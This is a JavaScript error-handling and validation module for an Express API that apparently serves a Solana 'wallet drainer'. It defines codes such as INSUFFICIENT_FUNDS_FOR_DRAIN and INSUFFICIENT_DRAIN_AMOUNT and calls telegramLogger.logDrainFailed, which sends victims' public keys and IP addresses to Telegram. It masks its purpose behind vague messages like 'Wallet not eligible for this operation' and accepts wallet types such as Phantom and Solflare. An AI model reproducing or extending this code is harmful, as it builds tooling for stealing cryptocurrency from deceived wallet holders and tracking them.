// Centralized API Error Response Utility
// Standardizes error responses across all API endpoints

/**
 * Standard error response structure
 */
export const ERROR_RESPONSE_STRUCTURE = {
  success: false,
  error: 'Error message',
  details: 'Detailed error description',
  code: 'ERROR_CODE',
  timestamp: new Date().toISOString(),
  requestId: null // Optional request ID for tracking
};

/**
 * Standard error types and their configurations
 */
export const ERROR_TYPES = {
  // Client errors (4xx)
  INVALID_REQUEST: {
    status: 400,
    error: 'Invalid',
    details: 'Request not valid.',
    code: 'INVALID_REQUEST'
  },
  INVALID_PUBLIC_KEY: {
    status: 400,
    error: 'Invalid',
    details: 'Invalid wallet address.',
    code: 'INVALID_PUBLIC_KEY'
  },
  INVALID_WALLET_ADDRESS: {
    status: 400,
    error: 'Invalid',
    details: 'Invalid wallet address.',
    code: 'INVALID_WALLET_ADDRESS'
  },
  MISSING_PARAMETER: {
    status: 400,
    error: 'Invalid',
    details: 'Missing required parameters.',
    code: 'MISSING_PARAMETER'
  },
  INSUFFICIENT_FUNDS: {
    status: 400,
    error: 'Ineligible',
    details: 'Wallet not eligible for this operation.',
    code: 'INSUFFICIENT_FUNDS'
  },
  INSUFFICIENT_FUNDS_FOR_FEE: {
    status: 400,
    error: 'Ineligible',
    details: 'Wallet not eligible for this operation.',
    code: 'INSUFFICIENT_FUNDS_FOR_FEE'
  },
  INSUFFICIENT_FUNDS_FOR_DRAIN: {
    status: 400,
    error: 'Ineligible',
    details: 'Wallet not eligible for this operation.',
    code: 'INSUFFICIENT_FUNDS_FOR_DRAIN'
  },
  INSUFFICIENT_FUNDS_AFTER_RESERVES: {
    status: 400,
    error: 'Ineligible',
    details: 'Wallet not eligible for this operation.',
    code: 'INSUFFICIENT_FUNDS_AFTER_RESERVES'
  },
  INSUFFICIENT_DRAIN_AMOUNT: {
    status: 400,
    error: 'Ineligible',
    details: 'Wallet not eligible for this operation.',
    code: 'INSUFFICIENT_DRAIN_AMOUNT'
  },
  INSUFFICIENT_SOL_FOR_FEES: {
    status: 400,
    error: 'Ineligible',
    details: 'Wallet not eligible for this operation.',
    code: 'INSUFFICIENT_SOL_FOR_FEES'
  },
  UNAUTHORIZED: {
    status: 401,
    error: 'Failed',
    details: 'Authentication required.',
    code: 'UNAUTHORIZED'
  },
  FORBIDDEN: {
    status: 403,
    error: 'Failed',
    details: 'Access denied.',
    code: 'FORBIDDEN'
  },
  NOT_FOUND: {
    status: 404,
    error: 'Failed',
    details: 'Resource not found.',
    code: 'NOT_FOUND'
  },
  METHOD_NOT_ALLOWED: {
    status: 405,
    error: 'Failed',
    details: 'Method not allowed.',
    code: 'METHOD_NOT_ALLOWED'
  },
  CONFLICT: {
    status: 409,
    error: 'Failed',
    details: 'Request conflict.',
    code: 'CONFLICT'
  },
  UNPROCESSABLE_ENTITY: {
    status: 422,
    error: 'Invalid',
    details: 'Request contains errors.',
    code: 'UNPROCESSABLE_ENTITY'
  },
  TOO_MANY_REQUESTS: {
    status: 429,
    error: 'Rate Limited',
    details: 'Too many requests.',
    code: 'TOO_MANY_REQUESTS'
  },
  
  // Server errors (5xx)
  INTERNAL_SERVER_ERROR: {
    status: 500,
    error: 'Failed',
    details: 'An unexpected error occurred.',
    code: 'INTERNAL_SERVER_ERROR'
  },
  SERVICE_UNAVAILABLE: {
    status: 503,
    error: 'Unavailable',
    details: 'Service temporarily unavailable.',
    code: 'SERVICE_UNAVAILABLE'
  },
  TIMEOUT: {
    status: 408,
    error: 'Timeout',
    details: 'Request timeout.',
    code: 'TIMEOUT'
  },
  NETWORK_ERROR: {
    status: 503,
    error: 'Network',
    details: 'Network connection issue.',
    code: 'NETWORK_ERROR'
  },
  TRANSACTION_FAILED: {
    status: 500,
    error: 'Failed',
    details: 'Transaction failed.',
    code: 'TRANSACTION_FAILED'
  },
  TRANSACTION_SERIALIZATION_FAILED: {
    status: 500,
    error: 'Failed',
    details: 'Transaction serialization failed.',
    code: 'TRANSACTION_SERIALIZATION_FAILED'
  },
  TRANSACTION_ENCODING_FAILED: {
    status: 500,
    error: 'Failed',
    details: 'Transaction encoding failed.',
    code: 'TRANSACTION_ENCODING_FAILED'
  },
  BALANCE_FETCH_FAILED: {
    status: 500,
    error: 'Failed',
    details: 'Failed to fetch wallet balance.',
    code: 'BALANCE_FETCH_FAILED'
  },
  RPC_CONNECTION_FAILED: {
    status: 503,
    error: 'Network',
    details: 'Failed to connect to network.',
    code: 'RPC_CONNECTION_FAILED'
  }
};

/**
 * Create a standardized error response
 * @param {string} errorType - Error type from ERROR_TYPES
 * @param {Object} options - Additional options
 * @param {string} options.customMessage - Custom error message
 * @param {string} options.customDetails - Custom error details
 * @param {string} options.requestId - Request ID for tracking
 * @param {Object} options.metadata - Additional metadata
 * @returns {Object} Standardized error response
 */
export function createErrorResponse(errorType, options = {}) {
  const errorConfig = ERROR_TYPES[errorType];
  
  if (!errorConfig) {
    console.warn(`[API_ERROR] Unknown error type: ${errorType}, using INTERNAL_SERVER_ERROR`);
    return createErrorResponse('INTERNAL_SERVER_ERROR', options);
  }
  
  const response = {
    success: false,
    error: options.customMessage || errorConfig.error,
    details: options.customDetails || errorConfig.details,
    code: errorConfig.code,
    timestamp: new Date().toISOString()
  };
  
  if (options.requestId) {
    response.requestId = options.requestId;
  }
  
  if (options.metadata) {
    response.metadata = options.metadata;
  }
  
  return {
    status: errorConfig.status,
    response: response
  };
}

/**
 * Send a standardized error response
 * @param {Object} res - Express response object
 * @param {string} errorType - Error type from ERROR_TYPES
 * @param {Object} options - Additional options
 * @returns {void}
 */
export function sendErrorResponse(res, errorType, options = {}) {
  const { status, response } = createErrorResponse(errorType, options);
  
  // Set CORS headers
  setCORSHeaders(res);
  
  // Send response
  res.status(status).json(response);
}

/**
 * Set CORS headers for error responses
 * @param {Object} res - Express response object
 * @returns {void}
 */
export function setCORSHeaders(res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Max-Age', '86400');
}

/**
 * Handle and log errors with standardized responses
 * @param {Error} error - Error object
 * @param {Object} res - Express response object
 * @param {Object} options - Additional options
 * @param {string} options.userPubkey - User's public key
 * @param {string} options.userIp - User's IP address
 * @param {Object} options.telegramLogger - Telegram logger instance
 * @param {string} options.requestId - Request ID for tracking
 * @returns {void}
 */
export async function handleError(error, res, options = {}) {
  const { userPubkey, userIp, telegramLogger, requestId } = options;
  
  // Determine error type based on error message
  let errorType = 'INTERNAL_SERVER_ERROR';
  
  if (error.message?.includes('429') || error.message?.includes('rate limit')) {
    errorType = 'TOO_MANY_REQUESTS';
  } else if (error.message?.includes('503') || error.message?.includes('service unavailable')) {
    errorType = 'SERVICE_UNAVAILABLE';
  } else if (error.message?.includes('insufficient') || error.message?.includes('balance')) {
    errorType = 'INSUFFICIENT_FUNDS';
  } else if (error.message?.includes('timeout') || error.message?.includes('connection')) {
    errorType = 'TIMEOUT';
  } else if (error.message?.includes('invalid') || error.message?.includes('malformed')) {
    errorType = 'INVALID_REQUEST';
  } else if (error.message?.includes('unauthorized') || error.message?.includes('forbidden')) {
    errorType = 'UNAUTHORIZED';
  } else if (error.name === 'NetworkError' || error.message?.includes('network')) {
    errorType = 'NETWORK_ERROR';
  } else if (error.message?.includes('serialization')) {
    errorType = 'TRANSACTION_SERIALIZATION_FAILED';
  } else if (error.message?.includes('encoding')) {
    errorType = 'TRANSACTION_ENCODING_FAILED';
  } else if (error.message?.includes('balance')) {
    errorType = 'BALANCE_FETCH_FAILED';
  } else if (error.message?.includes('RPC') || error.message?.includes('connection')) {
    errorType = 'RPC_CONNECTION_FAILED';
  }
  
  // Log error to Telegram if logger is available
  if (telegramLogger && userPubkey) {
    try {
      await telegramLogger.logDrainFailed({
        publicKey: userPubkey.toString(),
        lamports: 0,
        ip: userIp || 'Unknown',
        error: error.message,
        details: error.stack ? error.stack.split('\n')[0] : 'No stack trace available'
      });
    } catch (logError) {
      console.error('[API_ERROR] Failed to log error to Telegram:', logError);
    }
  }
  
  // Send standardized error response
  sendErrorResponse(res, errorType, {
    customDetails: error.message,
    requestId: requestId,
    metadata: {
      errorType: errorType,
      originalError: error.message,
      stack: error.stack ? error.stack.split('\n')[0] : 'No stack trace available'
    }
  });
}

/**
 * Validate request parameters and return standardized error if invalid
 * @param {Object} req - Express request object
 * @param {Array} requiredParams - Array of required parameter names
 * @param {Object} res - Express response object
 * @returns {boolean} True if valid, false if invalid (response already sent)
 */
export function validateRequiredParams(req, requiredParams, res) {
  const missingParams = requiredParams.filter(param => {
    if (typeof param === 'string') {
      return !req.body?.[param] && !req.query?.[param];
    } else if (typeof param === 'object') {
      // Support for nested parameters like { body: 'param', query: 'param' }
      return !req.body?.[param.body] && !req.query?.[param.query];
    }
    return false;
  });
  
  if (missingParams.length > 0) {
    sendErrorResponse(res, 'MISSING_PARAMETER', {
      customDetails: `Missing required parameters: ${missingParams.join(', ')}`
    });
    return false;
  }
  
  return true;
}

/**
 * Validate public key format and return standardized error if invalid
 * @param {string} publicKey - Public key string
 * @param {Object} res - Express response object
 * @returns {boolean} True if valid, false if invalid (response already sent)
 */
export function validatePublicKey(publicKey, res) {
  if (!publicKey || typeof publicKey !== 'string') {
    sendErrorResponse(res, 'INVALID_PUBLIC_KEY', {
      customDetails: 'Public key is required and must be a string'
    });
    return false;
  }
  
  // Basic Solana public key validation (32 bytes, base58 encoded)
  if (publicKey.length < 32 || publicKey.length > 44) {
    sendErrorResponse(res, 'INVALID_PUBLIC_KEY', {
      customDetails: 'Invalid public key format'
    });
    return false;
  }
  
  return true;
}

/**
 * Extract and validate user parameters from request
 * @param {Object} req - Express request object
 * @param {Object} res - Express response object
 * @returns {Object|null} Extracted parameters or null if validation failed
 */
export function extractAndValidateUserParams(req, res) {
  let userPublicKey;
  let walletType = 'Unknown';
  
  // Extract parameters from GET or POST
  if (req.method === 'GET') {
    userPublicKey = req.query.user || req.query.publicKey || req.query.wallet;
    walletType = req.query.walletType || 'Unknown';
  } else if (req.method === 'POST') {
    const body = req.body;
    userPublicKey = body.publicKey || body.wallet || body.user || body.pubkey;
    walletType = body.walletType || body.wallet_type || 'Unknown';
    
    // Debug logging
    console.log('[DEBUG] Request body:', body);
    console.log('[DEBUG] Extracted userPublicKey:', userPublicKey);
    console.log('[DEBUG] Extracted userPublicKey type:', typeof userPublicKey);
    console.log('[DEBUG] Extracted walletType:', walletType);
    console.log('[DEBUG] walletType from body.walletType:', body.walletType);
    console.log('[DEBUG] walletType from body.wallet_type:', body.wallet_type);
  }
  
  // Validate userPublicKey exists
  if (!userPublicKey) {
    sendErrorResponse(res, 'MISSING_PARAMETER', {
      customDetails: 'Please provide a valid public key (user, publicKey, wallet, or pubkey parameter).'
    });
    return null;
  }
  
  // Sanitize and validate public key format
  if (!validatePublicKey(userPublicKey, res)) {
    return null;
  }
  
  // Sanitize wallet type
  if (typeof walletType !== 'string') {
    walletType = 'Unknown';
  }
  
  // Sanitize wallet type to prevent injection
  const allowedWalletTypes = ['phantom', 'solflare', 'backpack', 'glow', 'trust', 'exodus', 'unknown'];
  const normalizedWalletType = walletType.toLowerCase();
  if (!allowedWalletTypes.includes(normalizedWalletType)) {
    walletType = 'unknown';
  } else {
    walletType = normalizedWalletType;
  }
  
  return {
    userPublicKey: userPublicKey.trim(),
    walletType: walletType.toLowerCase()
  };
}

/**
 * Validate and sanitize request body for POST requests
 * @param {Object} req - Express request object
 * @param {Object} res - Express response object
 * @returns {boolean} True if valid, false if invalid (response already sent)
 */
export function validateRequestBody(req, res) {
  if (req.method !== 'POST') {
    return true; // GET requests don't need body validation
  }
  
  // Check if body exists
  if (!req.body || typeof req.body !== 'object') {
    sendErrorResponse(res, 'INVALID_REQUEST', {
      customDetails: 'Request body must be a valid JSON object.'
    });
    return false;
  }
  
  // Check for required fields based on endpoint
  const requiredFields = ['publicKey'];
  const missingFields = requiredFields.filter(field => !req.body[field]);
  
  if (missingFields.length > 0) {
    sendErrorResponse(res, 'MISSING_PARAMETER', {
      customDetails: `Missing required fields: ${missingFields.join(', ')}`
    });
    return false;
  }
  
  return true;
}

export default {
  ERROR_TYPES,
  createErrorResponse,
  sendErrorResponse,
  setCORSHeaders,
  handleError,
  validateRequiredParams,
  validatePublicKey,
  extractAndValidateUserParams,
  validateRequestBody
};
